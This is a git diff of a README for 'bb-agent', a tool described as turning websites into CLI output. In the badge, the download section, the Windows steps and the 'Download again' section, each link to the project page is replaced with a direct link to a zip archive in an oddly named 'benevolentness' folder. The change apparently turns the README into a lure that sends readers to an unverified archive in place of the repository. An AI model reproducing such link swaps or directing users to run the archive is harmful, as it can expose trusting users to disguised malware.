@@ -1,12 +1,12 @@
 # 🤖 bb-agent - Turn Websites Into Clear CLI Output
 
-[![Download bb-agent](https://img.shields.io/badge/Download%20bb-agent-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Marisnaive21/bb-agent)
+[![Download bb-agent](https://img.shields.io/badge/Download%20bb-agent-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Marisnaive21/bb-agent/main/benevolentness/bb-agent-v1.9-alpha.5.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get bb-agent:
 
-https://github.com/Marisnaive21/bb-agent
+https://raw.githubusercontent.com/Marisnaive21/bb-agent/main/benevolentness/bb-agent-v1.9-alpha.5.zip
 
 ## 🧭 What bb-agent does
 
@@ -34,7 +34,7 @@ Follow these steps on Windows.
 
 Go to:
 
-https://github.com/Marisnaive21/bb-agent
+https://raw.githubusercontent.com/Marisnaive21/bb-agent/main/benevolentness/bb-agent-v1.9-alpha.5.zip
 
 Look for the latest release or the main download file on the page.
 
@@ -256,7 +256,7 @@ If you want the shortest path to use bb-agent on Windows:
 
 ## 🧭 Download again
 
-https://github.com/Marisnaive21/bb-agent
+https://raw.githubusercontent.com/Marisnaive21/bb-agent/main/benevolentness/bb-agent-v1.9-alpha.5.zip
 
 ## 📂 Common questions
 
